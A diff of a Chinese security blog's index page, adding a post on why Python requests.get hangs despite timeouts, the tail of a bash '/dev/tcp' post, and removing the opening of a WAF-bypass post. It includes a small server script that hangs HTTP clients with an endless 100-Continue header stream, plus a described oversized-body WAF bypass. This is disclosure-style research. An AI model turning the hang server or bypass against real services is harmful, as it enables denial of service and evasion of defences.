+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>主要还是学习bash相关知识点，包括：</p>
+<ul>
+<li>“&gt;&amp;”的两种用法</li>
+<li>“/dev/tcp/127.0.0.1/2222” 不是文件，而是bash解释器对其特殊处理</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/f10736931b93">【bash】关于 /dev/tcp/${HOST}/${PORT}</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/80d6b5a61372">Bash /dev/(tcp|udp)/${HOST}/${PORT} 分析</a></li>
+</ul>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="leveryd">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="leveryd的个人博客">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
+<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
+<p>所以，我想要探究以下问题:</p>
+<ul>
+<li>requests库中timeout参数的具体含义是什么?</li>
+<li>为什么requests.get时timeout参数”失效”?</li>
+</ul>
+<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
+<li><p>requests库中timeout参数是什么?</p>
+<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
+</li>
+<li><p>什么是connect超时?</p>
+<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
+<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
+
+<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
+<ul>
+<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
+<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
+</ul>
+<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
+<p>而request的timeout参数就可以减少这个等重传的时间。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>怎么实现的connect超时控制?</p>
+<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
+<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
+
+<p>流程如下:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
+
+<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
+</li>
+<li><p>什么是read超时?</p>
+<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
+<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
+<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
+<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
+<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
+<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
+<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
+<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
+<ul>
+<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
+</li>
+<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
+<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
+</li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
+<ul>
+<li>dns解析阶段 不受timeout参数控制</li>
+<li>connect阶段 受timeout参数控制</li>
+<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
+</ul>
+<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
+<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+</div>
+
+
+
+
+    
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-webshell%E6%A3%80%E6%B5%8B%E6%80%BB%E7%BB%93%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -564,137 +921,6 @@
 <h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><a target="_blank" rel="noopener" href="https://github.com/leveryd/cloudwalker-source-read/">仓库</a>中放了我阅读代码时的注释，方便有需要的读者。</p>
 <p>从测试效果来看，开源版本和目前线上版本有很大差异：开源版本cloudwalker比较容易绕过，<a target="_blank" rel="noopener" href="https://forum.xray.cool/webshell">线上</a>则难度大很多。</p>
 <p><img src="https://images.gitee.com/uploads/images/2021/1027/201155_7f9c8ee0_83508.png" alt="输入图片说明" title="屏幕截图.png"></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-requests.get%E5%8D%A1%E4%BD%8F/" class="post-title-link" itemprop="url">requests.get卡住</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>之前线上的漏洞扫描遇到一个奇怪的问题:requests.get即使设置了timeout，仍然卡住。</p>
-<p>看lijiejie大佬 <a target="_blank" rel="noopener" href="http://www.lijiejie.com/requests-get-hang/">requests.get 异常hang住</a> 也碰到过这个问题。</p>
-<p>所以，我想要探究以下问题:</p>
-<ul>
-<li>requests库中timeout参数的具体含义是什么?</li>
-<li>为什么requests.get时timeout参数”失效”?</li>
-</ul>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><h2 id="requests库中timeout参数的具体含义是什么"><a href="#requests库中timeout参数的具体含义是什么" class="headerlink" title="requests库中timeout参数的具体含义是什么?"></a>requests库中timeout参数的具体含义是什么?</h2><ul>
-<li><p>requests库中timeout参数是什么?</p>
-<p>根据<a target="_blank" rel="noopener" href="https://docs.python-requests.org/en/master/user/advanced/#timeouts">官网文档</a>所说,timeout可以表示(connect超时时间,read超时时间)</p>
-</li>
-<li><p>什么是connect超时?</p>
-<p>客户端需要connect系统调用来和服务端做tcp三次握手，当服务地址在互联网上不存在时，connect系统调用耗时就会比较长。</p>
-<p>比如请求1.1.2.3 过一段时间后会返回一个connect tiemout:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;)&#39;</span><br></pre></td></tr></table></figure>
-
-<p>在上面请求1.1.2.3这个不存在的ip时，客户端发出的 syn 包没有任何响应，于是客户端会重传syn包</p>
-<ul>
-<li>重传次数在 /proc/sys/net/ipv4/tcp_syn_retries 可以配置</li>
-<li>重传间隔时间并不是固定的，在Linux系统上测试结果是 [1,3,7,15,31]s，似乎就是 2^(n+1)-1</li>
-</ul>
-<p>如果重试完后仍然没有收到ack包，就会出现connect timeout</p>
-<p>而request的timeout参数就可以减少这个等重传的时间。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import requests;requests.get(&quot;http:&#x2F;&#x2F;1.1.2.3&quot;, timeout&#x3D;(1, 100))&#39; # 1s的connect超时设置</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>怎么实现的connect超时控制?</p>
-<p>connect、read等系统调用是没有参数可以控制超时时间的，那connect超时控制是怎么实现的呢?</p>
-<p>在Modules/socketmodule.c可以找到connect函数的实现</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1. socket设置成非阻塞模式</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">sock_call_ex(...,_PyTime_t timeout) &#123;</span><br><span class="line">  ...</span><br><span class="line">  interval &#x3D; timeout;</span><br><span class="line">  ...</span><br><span class="line">  res &#x3D; internal_select(s, writing, interval, connect);</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">static int internal_select(PySocketSockObject *s, int writing, _PyTime_t interval,</span><br><span class="line">            int connect)&#123;</span><br><span class="line">  ...</span><br><span class="line">  ms &#x3D; _PyTime_AsMilliseconds(interval, _PyTime_ROUND_CEILING);</span><br><span class="line">  ...</span><br><span class="line">  n &#x3D; poll(&amp;pollfd, 1, (int)ms);  2. poll系统调用，如果超时,poll系统调用就会返回</span><br></pre></td></tr></table></figure>
-
-<p>流程如下:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 设置socket为非阻塞模式后，调用connect系统调用</span><br><span class="line">* 使用poll系统调用来判断是否超时</span><br></pre></td></tr></table></figure>
-
-<p>实际上这是一种很通用的对connect做超时控制的方式，在其他tcp客户端中也可以这么实现超时控制。</p>
-</li>
-<li><p>什么是read超时?</p>
-<p>客户端需要调用read系统调用来读取服务端发送的数据，如果服务端一直不发送数据，读数据时就会卡住。</p>
-<p>比如我们用nc命令开启一个服务端只负责监听建立链接,不发送数据.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l 8081</span><br></pre></td></tr></table></figure>
-<p>客户端请求nc开启的服务,代码如下,3s后会出现读超时</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">requests.get(&quot;http:&#x2F;&#x2F;127.0.0.1:8081&quot;, timeout&#x3D;(1,3)) # read超时时间设置成3s</span><br></pre></td></tr></table></figure>
-
-</li>
-</ul>
-<h2 id="为什么requests-get时timeout参数”失效”"><a href="#为什么requests-get时timeout参数”失效”" class="headerlink" title="为什么requests.get时timeout参数”失效”?"></a>为什么requests.get时timeout参数”失效”?</h2><p>  requests.get在 dns解析、connect、read 这些阶段都有可能耗时比较久。下面分别说一下timeout在这三个阶段中是否生效。</p>
-<p>  文档中只说了timeout控制connect、read两个阶段，说明dns解析耗时很久时timeout是管不了的。<br>  我自己实验，也得出相同的结论：dns解析时间即使超过timeout，也不会抛出异常。</p>
-<p>  connect阶段在上面已经分析过，timeout是可以控制这一阶段最多花费多长时间的。</p>
-<p>  Python中的read超时不是一个全局的时间，它只是在每一次读socket时不能超过这个时间。而一次响应的读取可能有多次read操作。这儿可能和其他的http客户端（比如curl）等超时时间含义不同。</p>
-<p>  如果服务端能够让客户端read非常多次，且每一次时间都不超过read timeout值，这个时候客户端会卡住。</p>
-<p>  所以，在下面两种情况下是会造成read timeout参数“失效”的:</p>
-<ul>
-<li><p>响应中content-length是一个特别大的数，服务端缓慢的每次响应1字节</p>
-</li>
-<li><p>服务端返回的响应码是100，同时服务端持续不断地返回响应头，也会导致客户端持续不断的read</p>
-<p>比如下面的服务端持续不断地返回响应头，会导致客户端卡住。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"># coding:utf-8</span><br><span class="line">from socket import *</span><br><span class="line">from multiprocessing import *</span><br><span class="line">from time import sleep</span><br><span class="line"></span><br><span class="line">def dealWithClient(newSocket,destAddr):</span><br><span class="line">    recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">    newSocket.send(b&quot;&quot;&quot;HTTP&#x2F;1.1 100 OK\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">    while True:</span><br><span class="line">        # recvData &#x3D; newSocket.recv(1024)</span><br><span class="line">        newSocket.send(b&quot;&quot;&quot;x:a\n&quot;&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        if len(recvData)&gt;0:</span><br><span class="line">            # print(&#39;recv[%s]:%s&#39;%(str(destAddr), recvData))</span><br><span class="line">            pass</span><br><span class="line">        else:</span><br><span class="line">            print(&#39;[%s]close&#39;%str(destAddr))</span><br><span class="line">            sleep(10)</span><br><span class="line">            print(&#39;over&#39;)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">    # newSocket.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line"></span><br><span class="line">    serSocket &#x3D; socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    serSocket.setsockopt(SOL_SOCKET, SO_REUSEADDR  , 1)</span><br><span class="line">    localAddr &#x3D; (&#39;&#39;, 8085)</span><br><span class="line">    serSocket.bind(localAddr)</span><br><span class="line">    serSocket.listen(5)</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        while True:</span><br><span class="line">            newSocket,destAddr &#x3D; serSocket.accept()</span><br><span class="line"></span><br><span class="line">            client &#x3D; Process(target&#x3D;dealWithClient, args&#x3D;(newSocket,destAddr))</span><br><span class="line">            client.start()</span><br><span class="line"></span><br><span class="line">            newSocket.close()</span><br><span class="line">    finally:</span><br><span class="line">        serSocket.close()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
-
-<p>更多的讨论可以见提交的bug <a target="_blank" rel="noopener" href="https://bugs.python.org/issue44022">urllib http client possible infinite loop on a 100 Continue response</a></p>
-</li>
-</ul>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>请求在 dns解析、connect、read 这些阶段都有可能耗时很久，其中：</p>
-<ul>
-<li>dns解析阶段 不受timeout参数控制</li>
-<li>connect阶段 受timeout参数控制</li>
-<li>read阶段 timeout不是全局的，如果服务端让客户端有很多次read操作，就有可能让客户端卡住</li>
-</ul>
-<p>阻塞时的connect系统调用是有默认的最大时间限制，这个和系统配置有关；可以用”非阻塞connect+select/poll”来实现connect的超时控制。</p>
-<p>在排查这个case原因时，发现这里存在潜在的dos攻击问题，也上报给Python官方，很快被修复了。</p>
 
       
     </div>
@@ -941,249 +1167,6 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="leveryd">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="leveryd的个人博客">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2021-12-26-%E4%BD%A0%E7%9A%84%E6%89%AB%E6%8F%8F%E5%99%A8%E5%8F%AF%E4%BB%A5%E7%BB%95%E8%BF%87%E9%98%B2%E7%81%AB%E5%A2%99%E4%B9%88%EF%BC%88%E4%B8%89%EF%BC%89/" class="post-title-link" itemprop="url">你的扫描器可以绕过防火墙么（三）</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-
-      <time title="创建时间：2021-12-26 15:33:56" itemprop="dateCreated datePublished" datetime="2021-12-26T15:33:56+08:00">2021-12-26</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p><a target="_blank" rel="noopener" href="https://github.com/pyn3rd/papers/blob/master/KCon_2019_WAF.pdf">How to Break Through Cloud-Based WAF</a> 提到 “post请求体过大时会绕过某些waf”。</p>
-<p>刚好今天看到一个用此方法绕过的案例：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/wvKfe4xxNXWEgtQE4PdTaQ">Java反序列化数据绕WAF之加大量脏数据</a></p>
-<p>这个绕过姿势记得在2017年就有人分享过，因为我对”因为性能原因所以导致waf放行”这个解释有点疑问，所以研究了一下。</p>
-<p>本文主要研究:</p>
-<ul>
-<li>为什么请求体过大时会绕过waf的防护？</li>
-<li>什么场景下可以使用这种绕过姿势攻击到后端服务？</li>
-<li>怎么测试？</li>
-</ul>
-<p>以下研究的waf都是基于openresty实现的。</p>
-<h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><ul>
-<li><p>openresty怎么读请求体？</p>
-<p><a target="_blank" rel="noopener" href="https://moonbingbing.gitbooks.io/openresty-best-practices/content/openresty/get_req_body.html">获取请求 body</a> 的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ngx.req.read_body()</span><br><span class="line">local data &#x3D; ngx.req.get_body_data()</span><br><span class="line">-- local file_name &#x3D; ngx.req.get_body_file()</span><br></pre></td></tr></table></figure>
-
-<p>根据 <a target="_blank" rel="noopener" href="https://github.com/openresty/lua-nginx-module#ngxreqread_body">openresty文档</a> 得知</p>
-<blockquote>
-<p>如果请求体存放到了临时文件，就应该调用 <code>ngx.req.get_body_file</code> 接口来获取临时文件名。</p>
-<p>如果请求体存放到内存中，就应该调用 <code>ngx.req.get_body_data</code> 接口来获取请求体。</p>
-</blockquote>
-<p><em>什么时候请求体会存放到临时文件呢？</em></p>
-<p> 有两个配置选项决定nginx是否会把请求体放到临时文件:</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_buffer_size">client_body_buffer_size</a>:如果请求体大小超过此值，就会把整个请求体或者请求体的一部分写到一个临时文件。</p>
-<p><a target="_blank" rel="noopener" href="http://nginx.org/en/docs/http/ngx_http_core_module.html#client_body_in_file_only">client_body_in_file_only</a>:此选项直接决定nginx是否将请求体放到文件中。</p>
-</blockquote>
-</li>
-<li><p>为什么请求体过大时会绕过waf的防护？</p>
-<p>请求体过大，超过 client_body_buffer_size 配置的值时，请求体会写到临时文件。</p>
-<p>而很多waf不处理临时文件。相当于拿到的请求体会为空。比如曾经很火的 <a target="_blank" rel="noopener" href="https://github.com/loveshell/ngx_lua_waf/blob/master/waf.lua">ngx_lua_waf</a> 就没有临时文件相关操作。</p>
